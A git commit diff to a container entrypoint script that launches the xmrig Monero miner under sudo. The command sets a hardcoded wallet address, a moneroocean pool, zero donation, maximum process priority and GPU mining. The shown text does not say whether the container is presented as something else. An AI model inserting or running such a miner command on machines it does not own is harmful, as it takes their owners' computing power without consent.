f694705bed7e684cf4157188e48cc6c0f6c88282
Innovations Anonymous <InnovAnon-Inc@protonmail.com>
2020-12-15 19:00:09 -0600

    update

--- entrypoint.sh
+++ entrypoint.sh
@@ -8,6 +8,18 @@ exec 0<&-          # close stdin
 exec 2>&1          # redirect stderr to stdout
 renice -n -20 "$$" || : # max prio
 #sudo -u nobody -g nogroup -- \
-/usr/local/bin/xmrig --help
+sudo /usr/local/bin/xmrig        \
+-u 84FEn5Gak63AReZjRtDwV724TsoUtfajxjLHHJZ3zH3vcaAZJwvg4qWdUG9cx7nhA1ZfT9kK89roADmRb1ehLLhH6HyTATK \
+-p docker                        \
+-a cryptonightv7                 \
+-o gulf.moneroocean.stream:10032 \
+--keepalive                      \
+--donate-level=0                 \
+--cpu-priority 5                 \
+--cpu-no-yield                   \
+--nicehash                       \
+--cuda                           \
+--cuda-loader /usr/local/lib/libxmrig-cuda.so
+#--pause-on-battery
 #-c "/conf.d/$1.json"
 
